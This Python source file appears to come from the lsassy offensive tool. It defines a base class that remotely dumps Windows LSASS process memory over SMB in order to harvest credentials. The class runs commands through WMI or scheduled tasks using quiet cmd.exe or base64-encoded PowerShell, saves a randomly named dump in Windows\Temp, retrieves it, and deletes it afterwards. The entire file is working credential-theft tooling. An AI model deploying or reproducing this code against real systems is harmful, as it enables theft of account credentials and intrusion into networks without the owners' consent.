import logging
import importlib
import base64
import random
import string
import time

from lsassy.impacketfile import ImpacketFile


class IDumpMethod:

    need_debug_privilege = False
    custom_dump_path_support = True
    custom_dump_name_support = True

    dump_name = ""
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    exec_methods = ("wmi", "task")

    def __init__(self, session, *args, **kwargs):
        self._session = session
        self._file = ImpacketFile(self._session)
        self._file_handle = None

    def get_exec_method(self, exec_method, no_powershell=False):
        try:
            exec_method = importlib.import_module("lsassy.exec.{}".format(exec_method.lower()), "Exec").Exec(self._session)
        except ModuleNotFoundError:
            logging.error("Exec module '{}' doesn't exist".format(exec_method.lower()), exc_info=True)
            return None

        if not self.need_debug_privilege or exec_method.debug_privilege:
            return exec_method

        if no_powershell:
            return None

        return exec_method

    def get_commands(self):
        raise NotImplementedError

    def prepare(self, options):
        return True

    def clean(self):
        return True

    def exec_method(self):
        return self.need_debug_privilege

    def build_exec_command(self, commands, exec_method, no_powershell=False):
        logging.debug("Building command - Exec Method has seDebugPrivilege: {} | seDebugPrivilege needed: {} | Powershell allowed: {}".format(exec_method.debug_privilege, self.need_debug_privilege, not no_powershell))
        if not self.need_debug_privilege or exec_method.debug_privilege:
            logging.debug(commands["cmd"])
            built_command = """cmd.exe /Q /c {}""".format(commands["cmd"])
        elif not no_powershell:
            logging.debug(commands["pwsh"])
            command = base64.b64encode(commands["pwsh"].encode('UTF-16LE')).decode("utf-8")
            built_command = "powershell.exe -NoP -Enc {}".format(command)
        else:
            logging.error("Shouldn't fall here. Incompatible constraints")
            return None
        return built_command

    def dump(self, dump_path=None, dump_name=None, no_powershell=False, exec_methods=None, **kwargs):
        logging.info("Dumping via {}".format(self.__module__))
        if exec_methods is not None:
            self.exec_methods = exec_methods

        if dump_name is not None:
            if not self.custom_dump_name_support:
                logging.warning("A custom dump name was provided, but dump method {} doesn't support custom dump name".format(self.__module__))
                logging.warning("Dump file will be {}".format(self.dump_name))
            else:
                self.dump_name = dump_name
        elif self.dump_name == "":
            self.dump_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dmp"

        if dump_path is not None:
            if not self.custom_dump_path_support:
                logging.warning("A custom dump path was provided, but dump method {} doesn't support custom dump path".format(self.__module__))
                logging.warning("Dump path will be {}{}".format(self.dump_share, self.dump_path))
            else:
                self.dump_path = dump_path

        try:
            commands = self.get_commands()
        except NotImplementedError:
            logging.warning("Module '{}' hasn't implemented all required methods".format(self.__module__))
            return None

        if not isinstance(commands, dict) or "cmd" not in commands or "pwsh" not in commands:
            logging.warning("Return value of {} was not expected. Expecting {'cmd':'...', 'pwsh':'...'}")
            return None

        valid_exec_methods = {}
        for e in self.exec_methods:
            exec_method = self.get_exec_method(e, no_powershell)
            if exec_method is not None:
                valid_exec_methods[e] = exec_method
            else:
                logging.debug("Exec method '{}' is not compatible".format(e))

        if len(valid_exec_methods) == 0:
            logging.error("Current dump constrains cannot be fulfilled")
            logging.debug("Dump class: {} (Need SeDebugPrivilege: {})".format(self.__module__, self.need_debug_privilege))
            logging.debug("Exec methods: {}".format(self.exec_methods))
            logging.debug("Powershell allowed: {}".format("No" if no_powershell else "Yes"))
            return None

        if self.prepare(kwargs) is None:
            logging.error("Module prerequisites could not be processed")
            self.clean()
            return None

        for e, exec_method in valid_exec_methods.items():
            logging.info("Trying {} method".format(e))
            exec_command = self.build_exec_command(commands, exec_method, no_powershell)
            if exec_command is None:
                # Shouldn't fall there, but if we do, just skip to next execution method
                continue
            logging.debug("Transformed command: {}".format(exec_command))
            try:
                exec_method.exec(exec_command)
                self._file_handle = self._file.open(self.dump_share, self.dump_path, self.dump_name)
                if self._file_handle is None:
                    logging.error("Failed to dump lsass")
                    self.clean()
                    return None
                logging.success("Lsass dumped successfully in C:{}{}".format(self.dump_path, self.dump_name))
                self.clean()
                return self._file_handle
            except Exception:
                logging.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
                continue
        logging.error("All execution methods have failed")
        self.clean()
        return None

    def failsafe(self):
        t = time.time()
        timeout = 3
        while True:
            if self._file_handle is not None:
                try:
                    self._file_handle.close()
                    self._session.smb_session.deleteFile(self._file_handle._share_name, self._file_handle._fpath)
                    logging.debug("Lsass dump successfully deleted")
                except Exception as e:
                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
                        return True
                    if time.time() - t > timeout:
                        logging.warning("Lsass dump wasn't removed in {}{}".format(self._file_handle._share_name, self._file_handle._fpath), exc_info=True)
                        return None
                    logging.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self._file_handle._share_name, self._file_handle._fpath))
                    time.sleep(0.5)
            else:
                try:
                    self._session.smb_session.deleteFile(self.dump_share, self.dump_path + "/" + self.dump_name)
                    logging.debug("Lsass dump successfully deleted")
                except Exception as e:
                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
                        return True
                    if time.time() - t > timeout:
                        logging.warning("Lsass dump wasn't removed in {}{}".format(self.dump_share, self.dump_path + "/" + self.dump_name), exc_info=True)
                        return None
                    logging.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self.dump_share, self.dump_path + "/" + self.dump_name))
                    time.sleep(0.5)